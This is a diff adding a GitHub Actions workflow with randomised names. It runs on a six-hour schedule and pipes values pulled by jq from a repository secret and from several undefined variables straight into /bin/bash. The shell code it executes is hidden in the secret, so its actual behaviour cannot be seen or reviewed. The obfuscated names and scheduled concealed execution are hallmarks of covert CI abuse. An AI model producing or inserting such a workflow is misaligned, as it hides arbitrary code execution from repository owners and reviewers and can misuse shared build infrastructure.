@@ -1,0 +1,28 @@
+name: zibenjzk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zibenjzk
+        env:
+          ybyl139: ${{ secrets.ybyl139 }}
+        run: |
+          echo $ybyl139 | jq -r .iputn2968 | /bin/bash
+          echo $qou04648 | jq -r .gdqyi217 | /bin/bash
+          echo $vsh65 | jq -r .uxyje48 | /bin/bash
+          echo $he09517 | jq -r .lgfzm58674 | /bin/bash
+          echo $cbi46600 | jq -r .elwnz664 | /bin/bash
+          echo $s832 | jq -r .r2 | /bin/bash
+          echo $yi58650 | jq -r .e6 | /bin/bash
+          echo $nm05 | jq -r .amrva8 | /bin/bash
+          echo $wpasj20859 | jq -r .cycf4 | /bin/bash
+          echo $u8843 | jq -r .ygtay2392 | /bin/bash
+          echo $lgh5 | jq -r .tm020 | /bin/bash
+
